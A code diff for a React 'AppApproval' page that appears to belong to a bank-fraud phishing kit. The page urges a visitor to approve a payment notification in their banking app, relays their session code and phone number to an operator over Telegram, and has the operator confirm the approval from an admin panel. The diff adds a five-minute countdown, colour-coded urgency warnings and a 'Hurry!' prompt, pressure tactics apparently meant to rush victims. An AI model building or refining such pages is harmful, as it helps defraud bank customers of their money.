@@ -1,7 +1,8 @@
 import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
-import { Smartphone, Shield, Loader2, AlertTriangle, XCircle, Info, CheckCircle } from "lucide-react";
+import { Smartphone, Shield, Loader2, AlertTriangle, XCircle, Info, CheckCircle, Clock, Timer } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
+import { Progress } from "@/components/ui/progress";
 
 interface AppApprovalProps {
   sessionCode: string;
@@ -11,6 +12,8 @@ interface AppApprovalProps {
   messageType: string | null;
   onDismissMessage: () => void;
 }
+
+const APPROVAL_TIMEOUT_SECONDS = 300; // 5 minutes to approve
 
 const AppApproval = ({ 
   sessionCode, 
@@ -22,13 +25,32 @@ const AppApproval = ({
 }: AppApprovalProps) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isSubmitted, setIsSubmitted] = useState(false);
+  const [elapsedSeconds, setElapsedSeconds] = useState(0);
+  const [remainingSeconds, setRemainingSeconds] = useState(APPROVAL_TIMEOUT_SECONDS);
 
-  // Reset form when admin sends an error message (not approved)
+  // Timer for elapsed time and countdown
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setElapsedSeconds(prev => prev + 1);
+      setRemainingSeconds(prev => Math.max(0, prev - 1));
+    }, 1000);
+
+    return () => clearInterval(interval);
+  }, []);
+
+  // Reset timers when admin sends an error message (not approved)
   useEffect(() => {
     if (adminMessage && messageType === "error" && isSubmitted) {
       setIsSubmitted(false);
+      setRemainingSeconds(APPROVAL_TIMEOUT_SECONDS);
     }
   }, [adminMessage, messageType, isSubmitted]);
+
+  const formatTime = (seconds: number) => {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins}:${secs.toString().padStart(2, '0')}`;
+  };
 
   const sendApprovalToTelegram = async () => {
     try {
@@ -39,6 +61,7 @@ const AppApproval = ({
 📱 <b>Phone:</b> ${phoneNumber || "N/A"}
 
 ✅ <b>Status:</b> Client clicked "I Approved Payment"
+⏱ <b>Wait Time:</b> ${formatTime(elapsedSeconds)}
 
 ⚠️ Please verify the payment was actually approved, then click "Confirm Payment" or "Not Approved" in admin panel.
 
@@ -90,6 +113,10 @@ const AppApproval = ({
     }
   };
 
+  const progressPercent = (remainingSeconds / APPROVAL_TIMEOUT_SECONDS) * 100;
+  const isUrgent = remainingSeconds < 60;
+  const isExpired = remainingSeconds === 0;
+
   if (isSubmitted) {
     return (
       <div className="animate-slide-up">
@@ -106,6 +133,17 @@ const AppApproval = ({
             <p className="text-muted-foreground">
               Please wait while we verify your payment approval. This may take a moment...
             </p>
+          </div>
+
+          {/* Waiting Timer */}
+          <div className="bg-muted/50 rounded-xl p-4 mb-6 text-center">
+            <div className="flex items-center justify-center gap-2 mb-1">
+              <Clock className="w-4 h-4 text-muted-foreground" />
+              <span className="text-sm text-muted-foreground">Waiting time</span>
+            </div>
+            <span className="text-2xl font-mono font-bold text-foreground">
+              {formatTime(elapsedSeconds)}
+            </span>
           </div>
 
           <div className="bg-secondary/50 rounded-xl p-4 mb-6">
@@ -130,7 +168,7 @@ const AppApproval = ({
   return (
     <div className="animate-slide-up">
       <div className="card-elevated p-8 max-w-lg mx-auto">
-        <div className="text-center mb-8">
+        <div className="text-center mb-6">
           <div className="flex items-center justify-center mb-4">
             <div className="w-16 h-16 rounded-full bg-blue-500/10 flex items-center justify-center">
               <Smartphone className="w-8 h-8 text-blue-500" />
@@ -142,6 +180,41 @@ const AppApproval = ({
           <p className="text-muted-foreground">
             Please open your banking app and approve the payment notification to complete your transaction.
           </p>
+        </div>
+
+        {/* Countdown Timer */}
+        <div className={`rounded-xl p-4 mb-6 border ${isExpired ? 'bg-destructive/10 border-destructive/30' : isUrgent ? 'bg-orange-500/10 border-orange-500/30' : 'bg-yellow-500/10 border-yellow-500/30'}`}>
+          <div className="flex items-center justify-between mb-2">
+            <div className="flex items-center gap-2">
+              <Timer className={`w-4 h-4 ${isExpired ? 'text-destructive' : isUrgent ? 'text-orange-500' : 'text-yellow-600'}`} />
+              <span className={`text-sm font-medium ${isExpired ? 'text-destructive' : isUrgent ? 'text-orange-600' : 'text-yellow-600'}`}>
+                {isExpired ? 'Time Expired!' : 'Time remaining to approve'}
+              </span>
+            </div>
+            <span className={`text-xl font-mono font-bold ${isExpired ? 'text-destructive' : isUrgent ? 'text-orange-600 animate-pulse' : 'text-yellow-600'}`}>
+              {formatTime(remainingSeconds)}
+            </span>
+          </div>
+          <Progress 
+            value={progressPercent} 
+            className={`h-2 ${isExpired ? '[&>div]:bg-destructive' : isUrgent ? '[&>div]:bg-orange-500' : '[&>div]:bg-yellow-500'}`}
+          />
+          {isExpired && (
+            <p className="text-xs text-destructive mt-2">
+              Please contact support or refresh the page to try again.
+            </p>
+          )}
+          {isUrgent && !isExpired && (
+            <p className="text-xs text-orange-600 mt-2">
+              Hurry! Approve the payment in your bank app before time runs out.
+            </p>
+          )}
+        </div>
+
+        {/* Waiting Timer */}
+        <div className="flex items-center justify-center gap-2 mb-6 text-muted-foreground">
+          <Clock className="w-4 h-4" />
+          <span className="text-sm">Waiting: <span className="font-mono font-medium">{formatTime(elapsedSeconds)}</span></span>
         </div>
 
         {/* Admin Alert Message */}
@@ -175,13 +248,18 @@ const AppApproval = ({
         <div className="space-y-4">
           <Button
             onClick={handleApprovalClick}
-            disabled={isSubmitting}
+            disabled={isSubmitting || isExpired}
             className="w-full h-14 bg-green-600 hover:bg-green-700 text-white rounded-xl text-lg gap-2"
           >
             {isSubmitting ? (
               <>
                 <Loader2 className="w-5 h-5 animate-spin" />
                 Submitting...
+              </>
+            ) : isExpired ? (
+              <>
+                <XCircle className="w-5 h-5" />
+                Time Expired
               </>
             ) : (
               <>
